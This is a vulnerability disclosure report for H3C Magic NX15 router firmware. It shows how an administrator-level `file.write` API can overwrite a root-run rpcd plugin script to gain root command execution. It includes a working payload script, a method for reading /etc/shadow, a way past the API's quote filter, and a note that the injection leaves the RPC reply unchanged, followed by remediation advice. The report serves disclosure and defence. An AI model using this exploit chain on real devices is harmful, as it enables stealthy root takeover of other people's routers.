# Post-auth Root Code Execution via `file.write` overwriting an rpcd plugin

- **Vendor / Product**: H3C / Magic NX15
- **Affected version**: `NX15V100R017` (internal `NX15V100D025`)
- **Vulnerability type**: External Control of File Name or Path (CWE-73) leading
  to code execution (CWE-94)
- **Privilege required**: authenticated administrator
- **Impact**: remote command execution as **root**
- **CVSS 3.1**: `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` = **7.2**

---

## 1. The primitive: `file.write`

`/api/esps` exposes a small file API through the `file` ubus object, implemented
by the rpcd plugin `usr/lib/rpcd/file.so`:

```text
read   write   list   exec
```

`file.write` takes an arbitrary absolute path and a data string. `file.so` calls
`open`/`write` directly: there is **no path normalisation, no directory
restriction and no allow-list**. Verified writable locations on the test device:

```text
/www/  /usr/lib/lua/  /etc/  /lib/  /usr/bin/  /sbin/  /var/  /tmp/     all succeeded
```

`/rom` is the only path that resists (read-only squashfs).

## 2. Why this runs as root

```text
lighttpd (root)            <- server.username / server.groupname are commented out
  └─ /www/api (root)       <- FastCGI: lighttpd bin-path = /www/api
       └─ ubus call file write
            └─ /sbin/rpcd (root)   <- file.so is an rpcd plugin; it runs inside rpcd
```

`ps` on the device:

```text
6609 root  /sbin/rpcd
8151 root  /www/api
8146 root  /usr/sbin/lighttpd -D -f /etc/lighttpd/lighttpd.conf
1504 root  /sbin/ubusd
```

`lighttpd.conf`:

```text
#server.username             = "http"
#server.groupname            = "www-data"
```

**Direct evidence of root**: `file.read` retrieves `/etc/shadow`, which is mode
`0600`, owner `root`:

```text
/etc/shadow  first line: root::0:0:99999:7:::
```

## 3. From file write to code execution

`/usr/libexec/rpcd/*` are POSIX shell scripts, one per ubus object, executed by
`rpcd` **as root** when the object is invoked. They are mode `0755`.

Two facts combine:

1. `fopen(path, "w")` **preserves the mode of an existing file**. Overwriting a
   0755 script leaves it 0755 and still executable. (A *newly created* file gets
   0644 — which is why `file.exec` cannot run a file freshly created by
   `file.write`; see §6.)
2. `rpcd` dispatches to the plugin with `execv`, so the executable bit matters
   and the script is run with rpcd's privileges.

So: overwrite a plugin, invoke its object, get root.

### Payload used (self-preserving)

The payload writes evidence and then hands off to the **read-only** `/rom` copy
of the original script, so the ubus object keeps working normally:

```sh
#!/bin/sh
id>/www/download/rce_proof.txt
exec /bin/sh /rom/usr/libexec/rpcd/esps.system.led "$@"
```

Using `/rom` as the restore source is deliberate: the squashfs image is
immutable, so the original content is always available and cannot have been
altered by the attack.

## 4. Observed result

```text
before :  /usr/libexec/rpcd/esps.system.led   3011 bytes  sha256 882057964f0e9f58
file.write -> 97 bytes          (fopen("w") preserves the original 0755)

invoke :  esps.system.led get
          -> {"message":"COMMON:Success","data":{"status":"enable"},"code":0}
             (object still functional, because the payload delegates to /rom)

evidence: /www/download/rce_proof.txt = 'uid=0(root) gid=0(root)\n'
```

The API response being normal is itself useful: the injection is not detectable
from the RPC reply.

## 5. Restoration

Read the original from the read-only image and write it back:

```text
source : /rom/usr/libexec/rpcd/esps.system.led
restore: file.write with that content to /usr/libexec/rpcd/esps.system.led
verify : sha256 == 882057964f0e9f58, size == 3011   (matches /rom)
```

**Caveat**: if the original script contains a single quote, `file.write` is
rejected by the `/api/esps` body filter:

```text
{"code": 21,"message": "'"}
```

rpcd plugins routinely contain `'` (e.g. `case "$2" in`, `"${VAR}"`), so the
write must encode it as `\u0027` — see the companion report
`../usrlist_cmdi_root_rce/` §5. This was hit during restoration of the led
plugin and is a real operational dependency, not a theoretical one.

## 6. Boundary: what `file.write` cannot do

These limits are why the companion finding
`../importprofile_arbitrary_file_write/` remains relevant — the two primitives
are complementary rather than redundant.

| Capability | `file.write` | `importprofile` (tar) |
|---|---|---|
| content to arbitrary absolute path | yes | yes |
| overwrite existing file (mode preserved) | yes | yes |
| **new file with executable bit** | **no** (0644) | yes (tar member mode) |
| **symbolic link** | **no** (no such API) | yes (tar `SYMTYPE`) |
| **create directory** | **no** | yes |
| **delete file/directory** | **no** (truncate to 0 only) | yes (`rm -rvf /mnt/config/*`) |

Demonstrated: a script written by `file.write` to a *new* path is not executable
via `file.exec` (no output, no artefact), whereas the same script delivered by
`importprofile` with `mode=0755` executes and produces `uid=0(root)`.

## 7. Relationship to existing advisories

| Advisory | Covers | Relation |
|---|---|---|
| `CVE-2026-18900` | `file.exec` | **Different code path.** `file.exec` exposes command execution directly; this finding abuses `file.write` plus the plugins rpcd already executes. |
| `CVE-2026-18901` | `service.add` | Unrelated RPC method. |
| `usrlist` command injection (companion report) | `/usr/bin/usrlist` | Independent; neither requires the other. |

No CVE currently covers the `file.write` / `file.read` code paths.

## 8. Remediation

- Normalise and validate the path in `file.write` / `file.read`; reject paths
  outside an explicit allow-list (e.g. `/tmp/`, `/var/run/`, `/www/download/`).
- Resolve symbolic links before the containment check.
- Reconsider whether these methods should carry the same review as `file.exec`
  — as shipped they can read `/etc/shadow` and overwrite system binaries.
- Consider dropping privileges for the rpcd execution context, or verifying
  plugin integrity before dispatch.

## 9. References

- Firmware download portal:
  <https://www.h3c.com/cn/Service/Document_Software/Software_Download/Consume_product/>
- Companion reports for the same firmware: see the sibling
  directories of this one (each contains its own report and PoC).
